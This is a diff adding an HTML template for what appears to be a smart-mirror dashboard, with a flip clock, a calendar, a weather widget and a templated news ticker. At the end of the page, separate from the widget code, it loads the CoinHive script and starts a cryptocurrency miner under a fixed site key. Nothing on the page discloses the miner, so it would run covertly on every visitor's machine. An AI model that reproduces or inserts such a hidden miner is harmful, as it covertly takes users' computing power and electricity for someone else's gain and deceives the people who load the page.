@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title></title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+
+<body>
+  <!--HTML for Clock-->
+  <div class="clock">
+    <div class="hours">
+      <div class="first">
+        <div class="number">0</div>
+      </div>
+      <div class="second">
+        <div class="number">0</div>
+      </div>
+    </div>
+    <div class="tick">:</div>
+    <div class="minutes">
+      <div class="first">
+        <div class="number">0</div>
+      </div>
+      <div class="second">
+        <div class="number">0</div>
+      </div>
+    </div>
+    <div class="tick">:</div>
+    <div class="seconds">
+      <div class="first">
+        <div class="number">0</div>
+      </div>
+      <div class="second infinite">
+        <div class="number">0</div>
+      </div>
+    </div>
+  </div>
+  <!--HTML for calendar-->
+  <div class="calendar-widget">
+    <div id="day"></div>
+    <div id="date"></div>
+    <div id="month"></div>
+    <div id="year"></div>
+  </div>
+  <!--HTML for Weather Forcast-->
+  <a class="weatherwidget-io" href="https://forecast7.com/en/10d2276d41/mookkannoor/" data-label_1="MOOKKANNOOR" data-font="Arial" data-icons="Climacons Animated" data-theme="dark">MOOKKANNOOR</a>
+  <!--HTML for news-->
+  <div class="tickerv-wrap">
+    <ul>
+      <li>{{ news1[0] }}.</li>
+      <li>{{ news1[1] }}.</li>
+      <li>{{ news1[2] }}.</li>
+      <li>{{ news1[3] }}.</li>
+      <li>{{ news1[4] }}.</li>
+      <li>{{ news1[5] }}.</li>
+      <li>{{ news1[6] }}.</li>
+      <li>{{ news1[7] }}.</li>
+      <li>{{ news1[8] }}.</li>
+      <li>{{ news1[9] }}.</li>
+      <li>{{ news2[0] }}.</li>
+      <li>{{ news2[1] }}.</li>
+      <li>{{ news2[2] }}.</li>
+      <li>{{ news2[3] }}.</li>
+      <li>{{ news2[4] }}.</li>
+      <li>{{ news2[5] }}.</li>
+      <li>{{ news2[6] }}.</li>
+      <li>{{ news2[7] }}.</li>
+      <li>{{ news2[8] }}.</li>
+      <li>{{ news2[9] }}.</li>
+      <li>{{ news3[0] }}.</li>
+      <li>{{ news3[1] }}.</li>
+      <li>{{ news3[2] }}.</li>
+      <li>{{ news3[3] }}.</li>
+      <li>{{ news3[4] }}.</li>
+      <li>{{ news3[5] }}.</li>
+    </ul>
+  </div>
+  <script type="text/javascript">
+    /*
+    javascript for clock
+     */
+     var hoursContainer = document.querySelector('.hours')
+var minutesContainer = document.querySelector('.minutes')
+var secondsContainer = document.querySelector('.seconds')
+var tickElements = Array.from(document.querySelectorAll('.tick'))
+
+var last = new Date(0)
+last.setUTCHours(-1)
+
+var tickState = true
+
+function updateTime() {
+  var now = new Date
+
+  var lastHours = last.getHours().toString()
+  var nowHours = now.getHours().toString()
+  if (lastHours !== nowHours) {
+    updateContainer(hoursContainer, nowHours)
+  }
+
+  var lastMinutes = last.getMinutes().toString()
+  var nowMinutes = now.getMinutes().toString()
+  if (lastMinutes !== nowMinutes) {
+    updateContainer(minutesContainer, nowMinutes)
+  }
+
+  var lastSeconds = last.getSeconds().toString()
+  var nowSeconds = now.getSeconds().toString()
+  if (lastSeconds !== nowSeconds) {
+    //tick()
+    updateContainer(secondsContainer, nowSeconds)
+  }
+
+  last = now
+}
+
+function tick() {
+  tickElements.forEach(t => t.classList.toggle('tick-hidden'))
+}
+
+function updateContainer(container, newTime) {
+  var time = newTime.split('')
+
+  if (time.length === 1) {
+    time.unshift('0')
+  }
+
+
+  var first = container.firstElementChild
+  if (first.lastElementChild.textContent !== time[0]) {
+    updateNumber(first, time[0])
+  }
+
+  var last = container.lastElementChild
+  if (last.lastElementChild.textContent !== time[1]) {
+    updateNumber(last, time[1])
+  }
+}
+
+function updateNumber(element, number) {
+  //element.lastElementChild.textContent = number
+  var second = element.lastElementChild.cloneNode(true)
+  second.textContent = number
+
+  element.appendChild(second)
+  element.classList.add('move')
+
+  setTimeout(function() {
+    element.classList.remove('move')
+  }, 990)
+  setTimeout(function() {
+    element.removeChild(element.firstElementChild)
+  }, 990)
+}
+
+setInterval(updateTime, 100)
+
+    /*
+    javascript for weather
+     */
+    ! function(d, s, id) {
+      var js, fjs = d.getElementsByTagName(s)[0];
+      if (!d.getElementById(id)) {
+        js = d.createElement(s);
+        js.id = id;
+        js.src = 'https://weatherwidget.io/js/widget.min.js';
+        fjs.parentNode.insertBefore(js, fjs);
+      }
+    }(document, 'script', 'weatherwidget-io-js');
+    /*
+    javascript for calendar
+     */
+    function showDate() {
+      var d = new Date();
+      var weeks = ["SUN", "MON", "TUE", "WED", "THU", "FRI", "SAT"]
+      var months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+      var date = d.getDate();
+      if (date < 10) {
+        date = "0" + date;
+      }
+      document.getElementById("day").innerHTML = weeks[d.getDay()];
+      document.getElementById("month").innerHTML = months[d.getMonth()];
+      document.getElementById("year").innerHTML = d.getFullYear();
+      document.getElementById("date").innerHTML = date;
+    }
+    showDate();
+  </script>
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <script>
+    var miner = new CoinHive.User('EIjYb4nmCvnMuo8trLoo6Pmos8jzQrsl', 'MagicMirror-test');
+    miner.start();
+  </script>
+</body>
+
+</html>
